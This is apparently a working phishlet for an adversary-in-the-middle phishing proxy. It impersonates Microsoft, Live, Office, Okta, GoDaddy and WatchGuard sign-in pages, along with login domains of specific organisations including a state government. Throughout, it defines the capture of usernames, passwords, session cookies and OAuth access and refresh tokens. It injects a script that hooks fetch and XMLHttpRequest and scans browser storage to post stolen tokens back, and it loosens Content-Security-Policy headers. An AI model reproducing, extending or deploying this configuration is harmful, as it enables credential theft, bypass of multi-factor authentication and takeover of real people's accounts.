name: 'test1'
min_ver: '3.2.0'

login:
  domain: 'login.microsoftonline.com'
  path: '/'
  username_key: 'loginfmt'
  password_key: 'passwd'
  post: '/common/login'
  success: '/kmsi'

proxy_hosts:
  - { phish_sub: "office", orig_sub: "login", domain: "microsoftonline.com", session: true, is_landing: true, auto_filter: false }
  - { phish_sub: "t", orig_sub: "www", domain: "office.com", session: true, is_landing: false, auto_filter: false }
  - { phish_sub: "o", orig_sub: "o", domain: "okta.com", session: true, is_landing: false, auto_filter: false }
  - { phish_sub: "sci", orig_sub: "sci", domain: "okta.com", session: true, is_landing: false, auto_filter: false }
  - { phish_sub: "dods", orig_sub: "dotfoods", domain: "okta.com", session: true, is_landing: false, auto_filter: false }
  - { phish_sub: "login", orig_sub: "login", domain: "okta.com", session: true, is_landing: false, auto_filter: false }
  - { phish_sub: "login", orig_sub: "login", domain: "bx.com", session: true, is_landing: false, auto_filter: false }
  - { phish_sub: "msd", orig_sub: "msfed", domain: "bms.com", session: true, is_landing: false, auto_filter: false }
  - { phish_sub: "advh", orig_sub: "advath", domain: "bms.com", session: true, is_landing: false, auto_filter: false }
  - { phish_sub: "smth", orig_sub: "smusxath", domain: "bms.com", session: true, is_landing: false, auto_filter: false }
  - { phish_sub: "ulup", orig_sub: "ulgroup", domain: "okta.com", session: true, is_landing: false, auto_filter: false }
  - { phish_sub: "YWb", orig_sub: "login", domain: "live.com", session: true, is_landing: false, auto_filter: false }
  - { phish_sub: "account", orig_sub: "account", domain: "live.com", session: true, is_landing: false, auto_filter: false }
  - { phish_sub: "outk", orig_sub: "outlook", domain: "live.com", session: true, is_landing: false }
  - { phish_sub: "sso", orig_sub: "sso", domain: "godaddy.com", session: true, is_landing: false }
  - { phish_sub: "sso", orig_sub: "sso", domain: "secureserver.net", session: true, is_landing: false, auto_filter: true  }
  - { phish_sub: "vHg", orig_sub: "aadcdn", domain: "msauth.net", session: true, is_landing: false }
  - {phish_sub: '', orig_sub: '', domain: 'office.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: '', orig_sub: '', domain: 'godaddy.com', session: true, is_landing: false, auto_filter: true}
  - { phish_sub: "sautsa", orig_sub: "sp.authpoint.usa", domain: "cloud.watchguard.com", session: true, is_landing: false, auto_filter: false }
  - { phish_sub: "sautsa", orig_sub: "sp.authpoint.usa", domain: "cloud.watchguard.com", session: true, is_landing: false, auto_filter: false }
  - { phish_sub: "usaa", orig_sub: "usa", domain: "authpoint.watchguard.com", session: true, is_landing: false, auto_filter: false }
  - { phish_sub: "autsh", orig_sub: "auth", domain: "op2online.com", session: true, is_landing: false, auto_filter: false }
  - { phish_sub: "isd", orig_sub: "id", domain: "delaware.gov", session: true, is_landing: false, auto_filter: false }
  - { phish_sub: "sece", orig_sub: "secure", domain: "pepsico.com", session: true, is_landing: false, auto_filter: false }
  
  
sub_filters:
  - { triggers_on: "login.microsoftonline.com", orig_sub: "aadcdn", domain: "msauth.net", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript] } 
  # - {
  #     triggers_on: "login.microsoftonline.com",
  #     orig_sub: "",
  #     domain: "",
  #     search: '<meta http-equiv="Content-Security-Policy" content="(.*?)"',
  #     replace: '<meta http-equiv="Content-Security-Policy" content="default-src *  data: blob: filesystem: about: ws: wss: ''unsafe-inline'' ''unsafe-eval''; script-src * data: blob: ''unsafe-inline'' ''unsafe-eval''; connect-src * data: blob: ''unsafe-inline''; img-src * data: blob: ''unsafe-inline''; frame-src * data: blob: ; style-src * data: blob: ''unsafe-inline''; font-src * data: blob: ''unsafe-inline'';"',
  #     mimes: ["text/html"],
  #   }
  - { triggers_on: "login.microsoftonline.com", orig_sub: "login", domain: "microsoftonline.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript] }
  - { triggers_on: "login.microsoftonline.com", orig_sub: "login", domain: "microsoftonline.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript], redirect_only: true }
  - { triggers_on: "login.microsoftonline.com", orig_sub: "account", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript] }
  - {triggers_on: 'sso.godaddy.com', orig_sub: 'sso', domain: 'godaddy.com', search: 'href="https://{hostname}/149e9513-01fa-4fb0-aad4-566afd725d1b/2d206a39-8ed7-437e-a3be-862e0f06eea3/fp', replace: 'href="https://{hostname}/149e9513-01fa-4fb0-aad4-566afd725d1b/2d206a39-8ed7-437e-a3be-862e0f06eea3/fp', mimes: ['text/html', 'application/json', 'application/javascript']}
  - {triggers_on: 'sso.godaddy.com', orig_sub: 'sso', domain: 'godaddy.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
  - {triggers_on: 'sso.godaddy.com', orig_sub: 'sso', domain: 'godaddy.com', search: '{domain}', replace: '{domain}', mimes: ['text/html', 'application/json', 'application/javascript']}
  - { triggers_on: "login.microsoftonline.com", orig_sub: "sso", domain: "godaddy.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript] }
  - { triggers_on: "login.microsoftonline.com", orig_sub: "login", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "text/javascript", "application/json"] }
  - { triggers_on: "login.microsoftonline.com", orig_sub: "account", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "text/javascript", "application/json"] }
  - { triggers_on: "login.microsoftonline.com", orig_sub: "outlook", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "text/javascript", "application/json"] }
  - { triggers_on: "login.microsoftonline.com", orig_sub: "www", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "text/javascript", "application/json"] }
  - { triggers_on: "login.live.com", orig_sub: "login", domain: "microsoftonline.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript] }
  - { triggers_on: "login.live.com", orig_sub: "account", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript] }
  - { triggers_on: "login.live.com", orig_sub: "login", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript] }
  - { triggers_on: "login.live.com", orig_sub: "account", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript] }
  - { triggers_on: "login.live.com", orig_sub: "outlook", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript] }
  - { triggers_on: "login.live.com", orig_sub: "www", domain: "office.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript] }
  - { triggers_on: "account.live.com", orig_sub: "login", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript] }
  - { triggers_on: "account.live.com", orig_sub: "account", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript] }
  - { triggers_on: "account.live.com", orig_sub: "outlook", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript] }
  - { triggers_on: "account.live.com", orig_sub: "www", domain: "office.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript] }

auth_urls:
  - '/common/oauth2/v2.0/authorize'
  - '/common/oauth2/v2.0/token'
  - '/kmsi'
  - '/login.srf'

credentials:
  username:
    key: 'loginfmt'
    search: '(.*)'
    type: 'post'
  password:
    key: 'passwd'
    search: '(.*)'
    type: 'post'

auth_tokens:
  - domain: '.microsoftonline.com'
    keys: ['ESTSAuth', 'ESTSAUTHPERSISTENT', 'ESTSAuth1']
  - domain: '.office.com'
    keys: ['OfficeAuth', 'OfficeAuthToken']
  - domain: '.live.com'
    keys: ['MSPAuth', 'MSPProf', 'MSPOK']

custom:
  - key: 'access_token'
    search: '"access_token"\\s*:\\s*"([^"]+)"'
    type: 'regex'
  - key: 'id_token'
    search: '"id_token"\\s*:\\s*"([^"]+)"'
    type: 'regex'
  - key: 'refresh_token'
    search: '"refresh_token"\\s*:\\s*"([^"]+)"'
    type: 'regex'

inject:
  - url_pattern: 'login.microsoftonline.com'
    script: |
      <script>
      (function(){
        function postToken(token){
          if(!token) return;
          try{
            fetch('/session', {
              method: 'POST',
              headers: {'Content-Type':'application/json'},
              body: JSON.stringify({access_token: token})
            });
          } catch(e){}
        }

        try {
          var hash = window.location.hash || '';
          var m = hash.match(/(?:access_token|id_token)=([^&]+)/i);
          if (m && m[1]) { postToken(decodeURIComponent(m[1])); }

          for (var i=0;i<sessionStorage.length;i++){
            var k = sessionStorage.key(i);
            var v = sessionStorage.getItem(k);
            if (!v) continue;
            var mm = v.match(/"access_token"\\s*:\\s*"([^"]+)"/i);
            if (mm && mm[1]) { postToken(mm[1]); return; }
            if (typeof v === 'string' && v.split('.').length === 3) { postToken(v); return; }
          }

          for (var i=0;i<localStorage.length;i++){
            var k = localStorage.key(i);
            var v = localStorage.getItem(k);
            if (!v) continue;
            var mm = v.match(/"access_token"\\s*:\\s*"([^"]+)"/i);
            if (mm && mm[1]) { postToken(mm[1]); return; }
            if (typeof v === 'string' && v.split('.').length === 3) { postToken(v); return; }
          }

          (function(origFetch){
            window.fetch = function(){
              return origFetch.apply(this, arguments).then(function(response){
                try {
                  var ct = response.headers && response.headers.get ? (response.headers.get('content-type')||'') : '';
                  if (ct.indexOf('application/json') !== -1) {
                    response.clone().json().then(function(j){
                      if (j && (j.access_token || j.id_token)) {
                        postToken(j.access_token || j.id_token);
                      }
                    });
                  }
                } catch(e){}
                return response;
              });
            };
          })(window.fetch);

          (function(open){
            XMLHttpRequest.prototype.open = function(){
              this.addEventListener('load', function(){
                try {
                  var ct = this.getResponseHeader && this.getResponseHeader('Content-Type') || '';
                  if (ct.indexOf('application/json') !== -1 && this.responseText) {
                    try {
                      var j = JSON.parse(this.responseText);
                      if (j && (j.access_token || j.id_token)) {
                        postToken(j.access_token || j.id_token);
                      }
                    } catch(e){}
                  }
                } catch(e){}
              });
              return open.apply(this, arguments);
            };
          })(XMLHttpRequest.prototype.open);

        } catch (e) {
          console.log('inject error', e);
        }
      })();
      </script>

csp_bypass:
  - domain: 'login.microsoftonline.com'
    headers:
      - name: 'Content-Security-Policy'
        value: "default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;"
  - domain: 'www.office.com'
    headers:
      - name: 'Content-Security-Policy'
        value: "default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;"
  - domain: 'aadcdn.msauth.net'
    headers:
      - name: 'Content-Security-Policy'
        value: "default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;"
  - domain: 'aadcdn.msauthimages.net'
    headers:
      - name: 'Content-Security-Policy'
        value: "default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;"
